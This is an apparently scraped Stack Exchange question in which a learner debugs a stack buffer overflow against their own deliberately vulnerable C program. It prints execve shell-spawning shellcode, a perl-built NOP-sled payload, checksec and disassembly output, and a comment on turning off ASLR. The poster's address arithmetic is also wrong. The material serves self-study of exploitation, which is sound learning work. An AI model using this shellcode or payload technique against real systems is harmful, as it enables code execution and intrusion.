{
    "title": "Stack buffer overflow SIGSEGV help",
    "link": "https://reverseengineering.stackexchange.com/questions/16961/stack-buffer-overflow-sigsegv-help",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I've been going at this for a couple of days now working through trial and error but I can't seem to pinpoint exactly why I'm still getting a SIGSEGV. </p>\n<p>Here's the stdout of me stepping through the stack buffer overflow with gdb/gef: <a href=\"https://hastebin.com/hunekowasi.bash\" rel=\"nofollow noreferrer\">https://hastebin.com/hunekowasi.bash</a></p>\n<p>The source for the c bin i'm executing is:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char** argv) {\n    char buf[256];\n\n    if (argc &lt; 2) {\n        fprintf(stderr, \"ERROR: argc &lt; 2\");\n        return 1;\n    }\n\n    strcpy(buf, argv[1]);\n    return 0;\n}\n</code></pre>\n<p>I compile it with:</p>\n<pre><code>gcc -g -Wall -fno-stack-protector -m32 -I. main.c -o overflow\n</code></pre>\n<p>The machine im using has an 64 bit intel processor (little-endian), and I'm executing the <code>./overflow</code> bin with this command:</p>\n<blockquote>\n<p>gdb -q --args ./overflow $(perl -e 'print \"\\x90\" x 236 . \"\\x6a\\x0b\\x58\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80\" . \"\\xe8\\x9c\\xff\\xff\"')</p>\n</blockquote>\n<p>The char array im trying to overflow is 256 bytes (appears to be 260 bytes i believe).</p>\n<p><code>0x080484ab &lt;+69&gt;:  lea    eax,[ebp-0x108]</code></p>\n<p>This is verified when I intentionally try to segfault:</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master⚡ \n⇒  ./overflow $(perl -e \"print 'A' x 256\")\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master⚡ \n⇒  ./overflow $(perl -e \"print 'A' x 260\")\n[1]    18410 segmentation fault (core dumped)  ./overflow $(perl -e \"print 'A' x 260\")\n</code></pre>\n<p>After verifying the segfault occurs at 260, I create my payload:</p>\n<ul>\n<li>NOP sled = 236 bytes</li>\n<li>shellcode = 24 bytes</li>\n</ul>\n<p>I calculate for the jump by taking the beginning address of the buffer and adding 50 to it: <code>0xffff9cc0 + 50</code> giving <code>0xffff9c8e</code> which I reverse since I'm on a little-endian system and that ends up being: <code>\\x8e\\x9c\\xff\\xff</code>.</p>\n<p>The shellcode im using is the same shellcode i use in this source to verify it works on my system:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar shellcode[] = {\n    \"\\x6a\\x0b\"                      /* push   0xb */\n    \"\\x58\"                          /* pop    eax */\n    \"\\x31\\xf6\"                      /* xor    esi,esi */\n    \"\\x56\"                          /* push   esi */\n    \"\\x68\\x2f\\x2f\\x73\\x68\"          /* push   0x68732f2f */\n    \"\\x68\\x2f\\x62\\x69\\x6e\"          /* push   0x6e69622f */\n    \"\\x89\\xe3\"                      /* mov    ebx,esp */\n    \"\\x31\\xc9\"                      /* xor    ecx,ecx */\n    \"\\x89\\xca\"                      /* mov    edx,ecx */\n    \"\\xcd\\x80\"                      /* int    0x80 */\n};\n\nint main()\n{\n    printf(\"Shellcode Length:  %d\\n\", (int)strlen(shellcode));\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n    return 0;\n}\n</code></pre>\n<p>Though.. When i execute the bin passing it the crafted string, i get a SIGSEGV error. I've played around with it quite a bit and can't seem to get it to work. I feel like im missing something small. You can see the output from gdb in the hastebin link i provided above. </p>\n<p>edit - Adding some additional info that may be helpful.</p>\n<pre><code>@gef➤  checksec\n[+] checksec for '/home/th3v0id/repos/bufferoverflows/stack/01/overflow'\nCanary                        : No\nNX                            : No\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial\n\n@gef➤  disassemble main\nDump of assembler code for function main:\n=&gt; 0x08048466 &lt;+0&gt;: lea    ecx,[esp+0x4]\n   0x0804846a &lt;+4&gt;: and    esp,0xfffffff0\n   0x0804846d &lt;+7&gt;: push   DWORD PTR [ecx-0x4]\n   0x08048470 &lt;+10&gt;:    push   ebp\n   0x08048471 &lt;+11&gt;:    mov    ebp,esp\n   0x08048473 &lt;+13&gt;:    push   ecx\n   0x08048474 &lt;+14&gt;:    sub    esp,0x104\n   0x0804847a &lt;+20&gt;:    mov    eax,ecx\n   0x0804847c &lt;+22&gt;:    cmp    DWORD PTR [eax],0x1\n   0x0804847f &lt;+25&gt;:    jg     0x804849f &lt;main+57&gt;\n   0x08048481 &lt;+27&gt;:    mov    eax,ds:0x804a020\n   0x08048486 &lt;+32&gt;:    push   eax\n   0x08048487 &lt;+33&gt;:    push   0xf\n   0x08048489 &lt;+35&gt;:    push   0x1\n   0x0804848b &lt;+37&gt;:    push   0x8048554\n   0x08048490 &lt;+42&gt;:    call   0x8048330 &lt;fwrite@plt&gt;\n   0x08048495 &lt;+47&gt;:    add    esp,0x10\n   0x08048498 &lt;+50&gt;:    mov    eax,0x1\n   0x0804849d &lt;+55&gt;:    jmp    0x80484bf &lt;main+89&gt;\n   0x0804849f &lt;+57&gt;:    mov    eax,DWORD PTR [eax+0x4]\n   0x080484a2 &lt;+60&gt;:    add    eax,0x4\n   0x080484a5 &lt;+63&gt;:    mov    eax,DWORD PTR [eax]\n   0x080484a7 &lt;+65&gt;:    sub    esp,0x8\n   0x080484aa &lt;+68&gt;:    push   eax\n   0x080484ab &lt;+69&gt;:    lea    eax,[ebp-0x108]\n   0x080484b1 &lt;+75&gt;:    push   eax\n   0x080484b2 &lt;+76&gt;:    call   0x8048340 &lt;strcpy@plt&gt;\n   0x080484b7 &lt;+81&gt;:    add    esp,0x10\n   0x080484ba &lt;+84&gt;:    mov    eax,0x0\n   0x080484bf &lt;+89&gt;:    mov    ecx,DWORD PTR [ebp-0x4]\n   0x080484c2 &lt;+92&gt;:    leave  \n   0x080484c3 &lt;+93&gt;:    lea    esp,[ecx-0x4]\n   0x080484c6 &lt;+96&gt;:    ret    \nEnd of assembler dump.\n</code></pre>\n</div>",
    "votes": "1",
    "answers": 0,
    "views": "353",
    "tags": [
        "disassembly",
        "assembly",
        "binary-analysis",
        "gdb",
        "buffer-overflow"
    ],
    "user": "SelfTaught",
    "time": "Dec 13, 2017 at 21:44",
    "comments": [
        {
            "user": "sudhackar",
            "text": "<span class=\"comment-copy\">What about ASLR? I'd advise against returning to stack addresses as they vary even with slight change in environment. look for useful \"gadgets\".</span>",
            "time": null
        },
        {
            "user": "SelfTaught",
            "text": "<span class=\"comment-copy\">Thanks @sudhackar Your comment helped me figure out the issue, it was aslr. At first I didn't think that was the issue because in gef when i checked aslr previously, it reported as disabled (maybe it disables aslr by default? - need to dig into this more). Anyways, <code>cat /proc/sys/kernel/randomize_va_space</code> output 2. set <code>kernel.randomize_va_space = 0</code> in <code>/etc/sysctl.cnf</code>, did a reboot, and now it works when i run it outside of gef.</span>",
            "time": null
        }
    ],
    "answers_data": []
}